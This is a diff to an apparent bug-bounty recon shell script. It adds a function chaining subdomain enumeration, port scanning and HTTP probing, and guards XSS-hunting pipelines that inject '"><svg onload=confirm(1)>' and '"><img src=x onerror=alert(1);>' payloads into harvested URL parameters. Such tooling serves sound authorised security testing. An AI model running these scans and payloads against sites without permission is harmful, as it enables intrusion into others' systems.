@@ -39,6 +39,20 @@ getfreshresolvers() {
   dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o ~/tools/lists/my-lists/resolvers
 }
 
+newRecon(){
+  subdomainenum
+  [ -s "asn" ] && cat asn | metabigor net --asn | anew cidr
+  [ -s "cidr" ] && cat cidr | anew clean.subdomains
+  naabu -l clean.subdomains -top-ports 100 -silent -sa | httpx -silent -status-code -tech-detect -title -timeout 60 -threads 100 -o HTTPOK
+  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
+  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
+  cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
+  screenshot
+  dnsrecords
+  graphqldetect
+  xsshunter
+}
+
 ## findomain
 subdomainenum() {
   echo "[+] Recon subdomains..."
@@ -243,10 +257,10 @@ xsshunter() {
   # cat domain | waybackurls | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew urlbhedak.txt
   # [ -s "urlbhedak.txt" ] && cat urlbhedak.txt | notify -silent -id xss
   echo '[+] Airixss xss'
-  cat domain | gauplus | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
+  [ -s "domain" ] && cat domain | gauplus | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
   [ -s "airixss.txt" ] && cat airixss.txt | notify -silent -id xss
   echo '[+] Freq xss'
-  cat domain | gauplus | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
+  [ -s "domain" ] && cat domain | gauplus | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
   [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
   # [ -s "params" ] && cat params | hakcheckurl | grep 200 | awk '{print $2}' | anew xssvector
   # [ -s "xssvector" ] && cat xssvector | grep $Domain | kxss | awk -F " " '{print $9}' | anew XSS
